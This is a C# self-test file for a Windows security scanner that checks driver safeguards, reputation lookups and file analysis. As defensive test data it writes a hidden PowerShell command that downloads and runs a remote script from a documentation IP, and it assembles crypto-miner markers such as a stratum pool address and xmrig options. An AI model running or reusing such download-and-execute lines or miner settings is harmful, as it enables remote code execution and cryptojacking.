using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using MineHunter.Analysis;
using MineHunter.Guards;
using MineHunter.Model;
using MineHunter.Native;
using MineHunter.Report;
using MineHunter.Risk;
using MineHunter.Rules;
using MineHunter.Scanning;
using MineHunter.Update;
using MineHunter.Util;

namespace MineHunter
{
    public static partial class SelfTest
    {
        // ============================================================================================ Windows health, drivers
        static void HealthDriverChecks()
        {
            W.WriteLine("\nWindows health and drivers (read-only; no Windows setting is changed, no driver is installed)");
            var sw = System.Diagnostics.Stopwatch.StartNew();
            var items = WindowsHealth.Run();
            string[] need = { "defender", "defender.exclusions", "firewall", "smartscreen", "uac", "update", "secureboot", "tpm", "hvci", "hosts", "proxy", "winhttp", "dns", "powershell", "rdp", "remote", "shares" };
            Check("the health page answers for every area (" + items.Count + " items in " + sw.Elapsed.TotalSeconds.ToString("0.0") + " s)", need.All(n => items.Any(i => i.Id == n)) && items.All(i => !string.IsNullOrEmpty(i.Text)) && sw.Elapsed.TotalSeconds < 40, string.Join(",", need.Where(n => !items.Any(i => i.Id == n))));
            Check("a fix is offered only where a safe fix exists, and only from the known list", items.Where(i => i.CanFix).All(i => i.FixId == "defender.rtp" || i.FixId == "firewall.on" || i.FixId == "smartscreen.on" || i.FixId.StartsWith("defender.exclusion:")));
            Check("an unknown fix id is refused without running anything", WindowsHealth.ApplyFix("format c:") == "unknown fix" && WindowsHealth.ApplyFix(null) == "unknown fix");
            Check("dangerous Defender exclusions are recognised (drive, Temp, Downloads, AppData, profile), ordinary ones are not",
                WindowsHealth.DangerousExclusion(@"C:\") && WindowsHealth.DangerousExclusion(@"C:\Users\Anna\Downloads") && WindowsHealth.DangerousExclusion(@"C:\Users\Anna\AppData\Local\Temp") && WindowsHealth.DangerousExclusion(@"C:\ProgramData") && WindowsHealth.DangerousExclusion(@"C:\Windows")
                && !WindowsHealth.DangerousExclusion(@"C:\Games\Steam\steamapps") && !WindowsHealth.DangerousExclusion(@"D:\Projects\app\build") && !WindowsHealth.DangerousExclusion(@"C:\Program Files\Vendor\App"));

            var inv = Drivers.Inventory();
            Check("the driver inventory lists devices with version, date, provider and signature (" + inv.Count + " found)", inv.Count > 20 && inv.Any(d => !string.IsNullOrEmpty(d.Version) && d.Date.HasValue && !string.IsNullOrEmpty(d.Provider)) && inv.Any(d => d.HardwareIds.Count > 0));
            Check("drivers are grouped into the areas that matter (graphics, network, audio, storage, USB, ...)", inv.Select(d => d.Category).Distinct().Count() >= 4);

            Func<string, string, string, DriverUpdate> up = (title, cls, hw) => new DriverUpdate { Title = title, Class = cls, UpdateId = "uid-" + title, Manufacturer = "Vendor", Date = DateTime.Now, HardwareIds = new List<string> { hw } };
            Check("BIOS, UEFI and firmware updates are never automated", Drivers.Classify(up("Dell System BIOS Update 1.2", "Firmware", "X")) == DriverRisk.Never && Drivers.Classify(up("Intel Corporation - Firmware - 2.4", "Firmware", "X")) == DriverRisk.Never && Drivers.Classify(up("UEFI capsule", "System", "X")) == DriverRisk.Never);
            Check("storage-controller and chipset drivers need an explicit confirmation", Drivers.Classify(up("Intel Rapid Storage Technology driver", "SCSIAdapter", "X")) == DriverRisk.NeedsConfirmation && Drivers.Classify(up("Intel Chipset Device Software 10.1", "System", "X")) == DriverRisk.NeedsConfirmation);
            Check("an ordinary graphics or network driver is a normal update", Drivers.Classify(up("NVIDIA Display 551.23", "Display", "X")) == DriverRisk.Normal && Drivers.Classify(up("Realtek PCIe GbE Family Controller 10.60", "Net", "X")) == DriverRisk.Normal);

            var dev = new DriverInfo { Name = "Test GPU", HardwareId = @"PCI\VEN_10DE&DEV_2504", HardwareIds = new List<string> { @"PCI\VEN_10DE&DEV_2504&SUBSYS_1", @"PCI\VEN_10DE&DEV_2504" }, Version = "30.0.1.1", Date = DateTime.Now.AddYears(-1), Inf = "oem1.inf", Provider = "NVIDIA", Signed = true, DeviceClass = "DISPLAY" };
            var good = up("NVIDIA Display 551.23", "Display", @"PCI\VEN_10DE&DEV_2504");
            var wrongHw = up("NVIDIA Display 551.23", "Display", @"PCI\VEN_8086&DEV_0001");
            var oldDrv = up("NVIDIA Display 400.1", "Display", @"PCI\VEN_10DE&DEV_2504"); oldDrv.Date = DateTime.Now.AddYears(-3);
            var otherSrc = up("NVIDIA Display 551.23", "Display", @"PCI\VEN_10DE&DEV_2504"); otherSrc.Source = "driverpack-solution.example";
            var installed = new List<DriverInfo> { dev };
            Check("an update is accepted only when its Hardware ID matches an installed device", Drivers.CheckInstallable(good, installed) == null && Drivers.CheckInstallable(wrongHw, installed) != null);
            Check("an older driver than the installed one, an unknown source and a firmware package are refused", Drivers.CheckInstallable(oldDrv, installed) != null && Drivers.CheckInstallable(otherSrc, installed) != null && Drivers.CheckInstallable(up("BIOS Update", "Firmware", @"PCI\VEN_10DE&DEV_2504"), installed) != null);
            var log = new List<string>(); int installs = 0, restores = 0;
            var mock = new MockInstaller(() => { installs++; return null; });
            string r1 = Drivers.Install(good, false, m => log.Add(m), mock, t => { restores++; return "created"; }, installed);
            Check("installing a valid driver: restore point first, old driver saved, then one install through the allowed source", r1 == null && installs == 1 && restores == 1 && Drivers.Backups().Count == 1 && File.Exists(Path.Combine(Drivers.Backups()[0], "driver.json")), r1 + " " + string.Join("|", log));
            int before = installs;
            string r2 = Drivers.Install(wrongHw, false, null, mock, t => "x", installed);
            string r3 = Drivers.Install(up("Intel Rapid Storage Technology driver", "SCSIAdapter", @"PCI\VEN_10DE&DEV_2504"), false, null, mock, t => "x", installed);
            Check("a mismatching Hardware ID or an unconfirmed storage driver never reaches the installer", r2 != null && r3 != null && installs == before);
            string r4 = Drivers.Install(up("Intel Rapid Storage Technology driver", "SCSIAdapter", @"PCI\VEN_10DE&DEV_2504"), true, null, mock, t => "x", installed);
            Check("... and with the explicit confirmation it does", r4 == null && installs == before + 1);
            var failing = new MockInstaller(() => "the source refused");
            string r5 = Drivers.Install(good, false, null, failing, t => "x", installed);
            Check("a failed install reports the reason and says where the old driver was saved", r5 != null && r5.Contains("refused") && r5.Contains("drivers"), r5);
            Check("the vendor pages are official ones, and nothing is downloaded from them by the program", Drivers.VendorPage(dev) == "https://www.nvidia.com/Download/index.aspx" && Drivers.VendorPage(new DriverInfo { Manufacturer = "Unknown Corp", HardwareIds = new List<string> { "ACPI\\X" } }) == null);
        }

        sealed class MockInstaller : IDriverInstaller
        {
            readonly Func<string> f; public MockInstaller(Func<string> f) { this.f = f; }
            public string Install(DriverUpdate u, Action<string> log) { return f(); }
        }

        // ============================================================================================ reputation and the file report
        static void ReputationReportChecks(RulePack rules)
        {
            W.WriteLine("\nReputation sources and the file analyzer");
            string sha = new string('a', 64);
            var pk = new RulePack(); pk.BadHashes[sha] = "Test.Family"; pk.GoodHashes[new string('b', 64)] = "Example 1.0";
            var al = new Allowlist(); al.Sha256.Add(new string('c', 64));
            var lp = new LocalReputation(pk, al);
            Check("local reputation: known bad, known good, the user's own approval, and 'no data'", lp.Lookup(sha, 1).Status == RepStatus.KnownBad && lp.Lookup(new string('b', 64), 1).Status == RepStatus.KnownGood && lp.Lookup(new string('c', 64), 1).Status == RepStatus.KnownGood && lp.Lookup(new string('d', 64), 1).Status == RepStatus.NoData);
            Check("'no data' is never shown as safe", Reputation.StatusText(RepStatus.NoData).IndexOf("безопас", StringComparison.OrdinalIgnoreCase) < 0 && Reputation.StatusText(RepStatus.NoData).IndexOf("safe", StringComparison.OrdinalIgnoreCase) < 0);
            Check("the overall reading: bad beats suspicious beats good beats no data; an unavailable source counts for nothing",
                Reputation.Combine(new[] { new RepResult { Status = RepStatus.KnownGood }, new RepResult { Status = RepStatus.KnownBad } }) == RepStatus.KnownBad
                && Reputation.Combine(new[] { new RepResult { Status = RepStatus.KnownGood }, new RepResult { Status = RepStatus.Suspicious } }) == RepStatus.Suspicious
                && Reputation.Combine(new[] { new RepResult { Status = RepStatus.KnownBad, Available = false } }) == RepStatus.NoData
                && Reputation.Combine(new RepResult[0]) == RepStatus.NoData);
            Check("MineHunter Cloud is honestly 'not available' in this version and sends nothing", !new CloudReputation().Lookup(sha, 1).Available);

            // VirusTotal against a local stand-in: what is sent, how answers are read
            HttpListener srv = null; var seen = new List<string>();
            try
            {
                int port = FreePort();
                srv = new HttpListener(); srv.Prefixes.Add("http://127.0.0.1:" + port + "/"); srv.Start();
                var vtListener = srv;
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    while (true)
                    {
                        try
                        {
                            if (!vtListener.IsListening) break;
                            var c = vtListener.GetContext();
                            seen.Add(c.Request.HttpMethod + " " + c.Request.Url.AbsolutePath + " key=" + c.Request.Headers["x-apikey"] + " len=" + c.Request.ContentLength64);
                            string p = c.Request.Url.AbsolutePath; string body = "{}"; int code = 200;
                            if (p.EndsWith(new string('1', 64))) body = "{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":31,\"suspicious\":0,\"harmless\":0,\"undetected\":39},\"first_submission_date\":1700000000}}}";
                            else if (p.EndsWith(new string('2', 64))) body = "{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":0,\"suspicious\":0,\"harmless\":60,\"undetected\":10}}}}";
                            else if (p.EndsWith(new string('3', 64))) code = 404;
                            else if (p.EndsWith(new string('4', 64))) code = 401;
                            c.Response.StatusCode = code; var bytes = Encoding.UTF8.GetBytes(body); c.Response.OutputStream.Write(bytes, 0, bytes.Length); c.Response.Close();
                        }
                        catch { }
                    }
                });
                var vt = new VirusTotalProvider("test-key", "http://127.0.0.1:" + port + "/api/v3");
                var bad = vt.Lookup(new string('1', 64), 1); var clean = vt.Lookup(new string('2', 64), 1); var none = vt.Lookup(new string('3', 64), 1); var denied = vt.Lookup(new string('4', 64), 1);
                Check("VirusTotal answers are read: many engines = known bad, none = no verdict of safety beyond 'known good', 404 = no data, 401 = unavailable", bad.Status == RepStatus.KnownBad && bad.Malicious == 31 && bad.Total == 70 && clean.Status == RepStatus.KnownGood && none.Status == RepStatus.NoData && none.Available && !denied.Available);
                Check("only a GET with the hash in the address and the user's key is sent: no file, no body", seen.Count == 4 && seen.All(x => x.StartsWith("GET /api/v3/files/") && x.Contains("key=test-key") && x.EndsWith("len=0")));
                int n0 = seen.Count;
                Reputation.Lookup(new string('1', 64), 1, pk, al, new Settings { VirusTotalLookup = false });
                Check("with the VirusTotal switch off (the default) no request is made at all", seen.Count == n0);
                var off = Reputation.Lookup(new string('1', 64), 1, pk, al, new Settings { VirusTotalLookup = true });
                Check("switched on without a key it reports that it is not usable instead of asking", off.Any(r => r.Provider == "VirusTotal" && !r.Available) && seen.Count == n0);
                srv.Stop(); srv.Close(); srv = null;
                var offline = new VirusTotalProvider("k", "http://127.0.0.1:" + port + "/api/v3").Lookup(new string('1', 64), 1);
                Check("an unreachable VirusTotal is reported as unavailable, not as clean", !offline.Available && offline.Status == RepStatus.NoData);
            }
            finally { try { if (srv != null) { srv.Stop(); srv.Close(); } } catch { } }

            // the file analyzer
            string tmp = NewTemp("mh_fr_");
            try
            {
                string notepad = Path.Combine(PathUtil.System32, "notepad.exe"), cmd = Path.Combine(PathUtil.System32, "cmd.exe");
                string copy = Path.Combine(tmp, "tool.exe"); File.Copy(notepad, copy);
                var r = FileAnalyzer.Analyze(copy, new Settings(), false);
                Check("file report: identity (size, three hashes, kind), PE sections, imports, exports of a real program", r.Size == new FileInfo(copy).Length && r.Sha256 == Hashing.Sha256(copy) && r.Sha1.Length == 40 && r.Md5.Length == 32 && r.IsPe && r.Pe.Sections.Count >= 3 && r.Pe.ImportNames.Count > 10 && r.Kind.Length > 0);
                Check("file report: an unsigned, unknown program is 'no signs of a threat, but no data' - never 'safe'", (r.Verdict == FileVerdict.NoData || r.Verdict == FileVerdict.NoThreatSigns) && r.VerdictText.IndexOf("no data", StringComparison.OrdinalIgnoreCase) >= 0 || r.Verdict == FileVerdict.NoData || r.Verdict == FileVerdict.KnownTrusted, r.Verdict + " " + r.VerdictText);
                var rs = FileAnalyzer.Analyze(cmd, new Settings(), false);
                Check("file report: a Microsoft-signed system program is a known trusted file, with its signature and certificate chain", rs.Verdict == FileVerdict.KnownTrusted && rs.TrustedPublisher && !string.IsNullOrEmpty(rs.SignatureText), rs.Verdict + " " + rs.SignatureText);
                string fake = Path.Combine(tmp, "setup_free_tool.exe");
                File.WriteAllBytes(fake, File.ReadAllBytes(notepad).Concat(Encoding.ASCII.GetBytes("\n" + MinerWords() + "\n")).ToArray());
                var rf = FileAnalyzer.Analyze(fake, new Settings(), false);
                Check("file report: a program carrying miner markers is flagged, with the reasons and the markers listed", (rf.Verdict == FileVerdict.Suspicious || rf.Verdict == FileVerdict.Dangerous) && rf.Evidence.Count > 0 && rf.MinerMarkers.Count > 0 && rf.RulesFired.Count > 0, rf.Verdict + " " + rf.VerdictText + " score " + rf.Score);
                string ps = Path.Combine(tmp, "loader.ps1"); File.WriteAllText(ps, "powershell -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')\"");
                var rp = FileAnalyzer.Analyze(ps, new Settings(), false);
                Check("file report: a script is read as text; its URL and PowerShell fragments are listed", rp.Urls.Any(u => u.Contains("203.0.113.7")) && rp.Ips.Contains("203.0.113.7") && rp.PowerShell.Count >= 2 && rp.Kind.Length > 0);
                Check("file report: a missing file is reported as such", FileAnalyzer.Analyze(Path.Combine(tmp, "nope.exe"), new Settings(), false).Verdict == FileVerdict.Unreadable);
                var all = new[] { r, rs, rf, rp };
                Check("no verdict text ever says that a file 'is safe'", all.All(x => x.VerdictText != null && x.VerdictText.IndexOf("is safe", StringComparison.OrdinalIgnoreCase) < 0 && x.VerdictText.IndexOf("Файл безопасен", StringComparison.OrdinalIgnoreCase) < 0 && (x.Explanation ?? "").IndexOf("Файл безопасен", StringComparison.OrdinalIgnoreCase) < 0));
            }
            finally { try { Directory.Delete(tmp, true); } catch { } }
        }

        /// <summary>Several miner markers from different groups, built in pieces so that this program's own file holds none of them.</summary>
        static string MinerWords()
        {
            return Obf.J("stra", "tum+tcp://pool.example.invalid:3333") + "\n" + Obf.J("xm", "rig") + " " + Obf.J("don", "ate-level") + "\n" + Obf.J("random", "x") + " " + Obf.J("crypto", "night") + " " + Obf.J("mining.", "subscribe") + " " + Obf.J("--cpu-", "priority") + " " + Obf.J("pool.", "mine", "xmr.com");
        }
    }
}
